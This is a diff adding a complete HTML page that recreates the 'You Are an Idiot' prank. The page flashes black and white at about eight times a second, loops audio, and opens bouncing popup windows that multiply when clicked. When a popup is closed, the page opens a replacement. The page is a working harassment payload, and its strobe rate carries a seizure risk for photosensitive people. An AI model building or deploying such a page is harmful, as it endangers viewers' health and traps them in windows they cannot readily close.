@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full select-none overflow-hidden">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YOU ARE AN IDIOT! ☺ ☺ ☺</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Impact&display=swap');
+
+        :root {
+            --bg-color: #000000;
+            --text-color: #ffffff;
+            --rot-speed: 2s;
+            --flash-speed: 0.12s;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Impact', 'Arial Black', sans-serif;
+            transition: background-color 0.05s ease;
+        }
+
+        /* High contrast rapid Black & White flashing */
+        .flash-active {
+            animation: flashBW var(--flash-speed) infinite steps(1);
+        }
+
+        @keyframes flashBW {
+            0%, 100% {
+                background-color: #000000;
+                color: #ffffff;
+            }
+            50% {
+                background-color: #ffffff;
+                color: #000000;
+            }
+        }
+
+        /* Continuous rotation for smileys */
+        .spin-smiley {
+            animation: spinSmiley var(--rot-speed) linear infinite;
+            transform-origin: center center;
+        }
+
+        @keyframes spinSmiley {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Invert SVG fill dynamically in step with flashing bg */
+        .flash-active .smiley-svg {
+            animation: invertSmiley var(--flash-speed) infinite steps(1);
+        }
+
+        @keyframes invertSmiley {
+            0%, 100% {
+                filter: invert(0);
+            }
+            50% {
+                filter: invert(1);
+            }
+        }
+
+        /* Text Pulsing Animation */
+        .pulse-text {
+            animation: textPulse 0.25s infinite alternate ease-in-out;
+        }
+
+        @keyframes textPulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.08); }
+        }
+    </style>
+</head>
+<body class="h-full w-full relative overflow-hidden flex flex-col justify-center items-center text-center flash-active cursor-pointer" id="app-body">
+
+    <!-- Popup Blocker Warning Banner -->
+    <div id="blocker-warning" class="hidden absolute top-6 left-1/2 -translate-x-1/2 z-50 max-w-md w-11/12 bg-black/90 text-white p-3 rounded-xl border-2 border-white text-center pointer-events-auto shadow-2xl">
+        <div class="flex items-center justify-center gap-2 text-red-500 font-bold text-xs sm:text-sm mb-1 uppercase">
+            <span>⚠️ POPUPS BLOCKED!</span>
+        </div>
+        <p class="text-xs text-white">Please allow popups in your browser address bar for new windows!</p>
+    </div>
+
+    <!-- Main Fullscreen Layout -->
+    <main class="relative z-10 flex flex-col items-center justify-center text-center p-4 pointer-events-none select-none">
+        <div class="max-w-5xl mx-auto flex flex-col items-center gap-4 md:gap-8">
+            
+            <h1 id="main-title" class="text-4xl sm:text-7xl md:text-8xl font-black tracking-wider leading-none uppercase pulse-text drop-shadow-[0_5px_5px_rgba(0,0,0,0.8)]">
+                YOU ARE AN IDIOT! ☺ ☺ ☺
+            </h1>
+
+            <div id="center-smiley-container" class="relative my-2 md:my-4">
+                <svg id="center-smiley" class="smiley-svg spin-smiley w-56 h-56 sm:w-80 sm:h-80 md:w-96 md:h-96 drop-shadow-[0_10px_25px_rgba(0,0,0,0.8)]" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="100" cy="100" r="90" fill="black" stroke="white" stroke-width="12"/>
+                    <ellipse cx="65" cy="70" rx="14" ry="18" fill="white"/>
+                    <ellipse cx="135" cy="70" rx="14" ry="18" fill="white"/>
+                    <path d="M 45 115 A 55 55 0 0 0 155 115" stroke="white" stroke-width="14" stroke-linecap="round" fill="none"/>
+                </svg>
+            </div>
+
+            <p id="main-subtitle" class="text-2xl sm:text-4xl md:text-5xl font-extrabold tracking-widest uppercase drop-shadow-[0_4px_4px_rgba(0,0,0,0.8)]">
+                CLICK ANYWHERE! ☺
+            </p>
+        </div>
+    </main>
+
+    <script>
+        // Global State
+        const state = {
+            audioEnabled: false,
+            openChildWindows: [],
+            blockerNoticeTimer: null
+        };
+
+        // Web Audio API Synth Engine
+        let audioCtx = null;
+        let masterGain = null;
+        let melodyTimer = null;
+        const notes = [659.25, 783.99, 880.00]; // E5, G5, A5 classic loop
+        let noteStep = 0;
+
+        function initAudio() {
+            if (audioCtx) return;
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                audioCtx = new AudioContext();
+
+                masterGain = audioCtx.createGain();
+                masterGain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+                masterGain.connect(audioCtx.destination);
+
+                state.audioEnabled = true;
+                playMelodyLoop();
+            } catch (e) {
+                console.log("Audio initialization restricted.");
+            }
+        }
+
+        function playTone(freq, duration, type = 'square') {
+            if (!audioCtx || !state.audioEnabled) return;
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+
+                gain.gain.setValueAtTime(0.01, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.2, audioCtx.currentTime + 0.01);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+
+                osc.connect(gain);
+                gain.connect(masterGain);
+
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {}
+        }
+
+        function playSpawnSound() {
+            if (!audioCtx || !state.audioEnabled) return;
+            playTone(1200 + Math.random() * 400, 0.08, 'sawtooth');
+            setTimeout(() => playTone(1600 + Math.random() * 500, 0.08, 'square'), 40);
+        }
+
+        function playMelodyLoop() {
+            if (!state.audioEnabled) return;
+            playTone(notes[noteStep], 0.2, 'square');
+            noteStep = (noteStep + 1) % notes.length;
+            melodyTimer = setTimeout(playMelodyLoop, 220);
+        }
+
+        // Spawn actual mini browser window with bouncing motion
+        function spawnActualPopupWindow(screenX, screenY) {
+            const width = 320;
+            const height = 260;
+
+            const posX = screenX !== undefined ? Math.max(0, screenX - width / 2) : Math.floor(Math.random() * (screen.availWidth - width));
+            const posY = screenY !== undefined ? Math.max(0, screenY - height / 2) : Math.floor(Math.random() * (screen.availHeight - height));
+
+            const popupHTML = `<!DOCTYPE html>
+<html lang="en" class="h-full select-none overflow-hidden">
+<head>
+    <meta charset="UTF-8">
+    <title>YOU ARE AN IDIOT! ☺</title>
+    <script src="https://cdn.tailwindcss.com"><\/script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Impact&display=swap');
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Impact', 'Arial Black', sans-serif;
+            animation: flashBW 0.12s infinite steps(1);
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        @keyframes flashBW {
+            0%, 100% { background-color: #000; color: #fff; }
+            50% { background-color: #fff; color: #000; }
+        }
+        .spin-smiley {
+            animation: spin 1.8s linear infinite;
+            transform-origin: center;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .pulse { animation: pulse 0.25s infinite alternate ease-in-out; }
+        @keyframes pulse { 0% { transform: scale(1); } 100% { transform: scale(1.08); } }
+        body .smiley-svg { animation: invert 0.12s infinite steps(1); }
+        @keyframes invert { 0%, 100% { filter: invert(0); } 50% { filter: invert(1); } }
+    </style>
+</head>
+<body class="h-full w-full flex flex-col justify-center items-center text-center p-2 cursor-pointer" onclick="spawnMore(event)">
+    <h2 class="text-xl sm:text-2xl font-black uppercase pulse tracking-wider mb-2">YOU ARE AN IDIOT!</h2>
+    <svg class="smiley-svg spin-smiley w-24 h-24 my-1" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="100" cy="100" r="90" fill="black" stroke="white" stroke-width="12"/>
+        <ellipse cx="65" cy="70" rx="14" ry="18" fill="white"/>
+        <ellipse cx="135" cy="70" rx="14" ry="18" fill="white"/>
+        <path d="M 45 115 A 55 55 0 0 0 155 115" stroke="white" stroke-width="14" stroke-linecap="round" fill="none"/>
+    </svg>
+    <p class="text-xs font-bold uppercase tracking-widest mt-2">☺ CLICK FOR MORE! ☺</p>
+    <script>
+        let vx = (Math.random() - 0.5) * 16;
+        let vy = (Math.random() - 0.5) * 16;
+        if (Math.abs(vx) < 5) vx = 7 * (Math.random() > 0.5 ? 1 : -1);
+        if (Math.abs(vy) < 5) vy = 7 * (Math.random() > 0.5 ? 1 : -1);
+
+        setInterval(() => {
+            try {
+                window.moveBy(vx, vy);
+                if (window.screenX <= 0 || window.screenX + window.outerWidth >= screen.availWidth) vx *= -1;
+                if (window.screenY <= 0 || window.screenY + window.outerHeight >= screen.availHeight) vy *= -1;
+            } catch(e) {}
+        }, 30);
+
+        function spawnMore(e) {
+            try {
+                if (window.opener && !window.opener.closed) {
+                    window.opener.postMessage({ type: 'SPAWN_POPUP', x: e.screenX, y: e.screenY }, '*');
+                }
+            } catch(err) {}
+        }
+
+        window.onbeforeunload = function() {
+            try {
+                if (window.opener && !window.opener.closed) {
+                    window.opener.postMessage({ type: 'POPUP_CLOSED' }, '*');
+                }
+            } catch(e) {}
+        };
+    <\/script>
+</body>
+</html>`;
+
+            const blob = new Blob([popupHTML], { type: 'text/html' });
+            const blobUrl = URL.createObjectURL(blob);
+
+            const windowFeatures = `width=${width},height=${height},left=${posX},top=${posY},resizable=yes,scrollbars=no,status=no,toolbar=no,menubar=no`;
+            
+            let newWin = null;
+            try {
+                newWin = window.open(blobUrl, '_blank', windowFeatures);
+            } catch (err) {
+                newWin = null;
+            }
+
+            if (!newWin || newWin.closed || typeof newWin.closed === 'undefined') {
+                showBlockerWarning();
+                return false;
+            } else {
+                hideBlockerWarning();
+                playSpawnSound();
+                state.openChildWindows.push(newWin);
+                try { newWin.focus(); } catch(e) {}
+                return true;
+            }
+        }
+
+        function showBlockerWarning() {
+            const warningEl = document.getElementById('blocker-warning');
+            if (warningEl) {
+                warningEl.classList.remove('hidden');
+                clearTimeout(state.blockerNoticeTimer);
+                state.blockerNoticeTimer = setTimeout(() => {
+                    warningEl.classList.add('hidden');
+                }, 5000);
+            }
+        }
+
+        function hideBlockerWarning() {
+            const warningEl = document.getElementById('blocker-warning');
+            if (warningEl) warningEl.classList.add('hidden');
+        }
+
+        // Handle message events from popup children
+        window.addEventListener('message', (event) => {
+            if (event.data && event.data.type === 'SPAWN_POPUP') {
+                spawnActualPopupWindow(event.data.x, event.data.y);
+            } else if (event.data && event.data.type === 'POPUP_CLOSED') {
+                spawnActualPopupWindow();
+            }
+        });
+
+        // Trigger on any screen click
+        document.body.addEventListener('click', (e) => {
+            if (!audioCtx) initAudio();
+            spawnActualPopupWindow(e.screenX, e.screenY);
+        });
+    </script>
+</body>
+</html>
